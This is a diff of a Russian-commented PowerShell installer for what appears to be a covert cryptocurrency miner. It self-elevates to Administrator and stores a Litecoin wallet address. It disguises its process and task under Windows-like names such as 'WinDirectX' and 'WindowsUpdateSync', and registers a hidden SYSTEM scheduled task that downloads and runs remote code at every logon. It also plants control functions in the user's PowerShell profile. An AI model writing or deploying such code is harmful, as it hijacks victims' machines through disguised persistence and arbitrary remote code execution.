@@ -1,4 +1,3 @@
-
 # 0. Самовозвышение до Администратора (Лифт)
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $arguments = "& '" + $myinvocation.mycommand.definition + "'"
@@ -6,6 +5,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Break
 }
 
+# --- КОНФИГУРАЦИЯ ---
 $path = "C:\ProgramData\SystemLib"
 $wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
 $procName = "WinDirectX"
@@ -49,11 +49,11 @@ Write-Host "[6/8] Настройка скрытой службы..." -NoNewline
 $taskName = "WindowsUpdateSync"
 $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
 $trigger = New-ScheduledTaskTrigger -AtLogOn
-# Регистрируем задачу от имени SYSTEM (самый высокий уровень прав)
+# Регистрируем задачу от имени SYSTEM
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
 Write-Host " Ок." -ForegroundColor Green
 
-# 7. Функции контроля (check и update)
+# 7. Функции контроля (check, update, delete)
 $ProfilePath = $PROFILE
 if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
 $Functions = @"
@@ -66,11 +66,23 @@ function check {
 }
 function update { 
     Write-Host "Обновление с GitHub..." -ForegroundColor Cyan
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     irm '$rawScript' | iex 
+}
+function delete {
+    Write-Host "ПОЛНОЕ УДАЛЕНИЕ СИСТЕМЫ..." -ForegroundColor Red
+    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
+    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs" -ErrorAction SilentlyContinue
+    Write-Host "Файлы и задачи удалены. Очистка профиля..." -ForegroundColor Yellow
+    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
+    Write-Host "ГОТОВО. Система полностью удалена." -ForegroundColor Green
 }
 "@
 $Functions | Out-File -FilePath $ProfilePath -Force
 
 # 8. Запуск
 Start-Process -FilePath "$path\win_start.vbs"
-Write-Host "`n--- ВСЁ ГОТОВО! ПРАВА SYSTEM ПОЛУЧЕНЫ ---" -ForegroundColor Magenta
+Write-Host "`n--- ВСЁ ГОТОВО! СИСТЕМА АКТИВИРОВАНА ---" -ForegroundColor Magenta
+Write-Host "Команды: check, update, delete" -ForegroundColor Gray
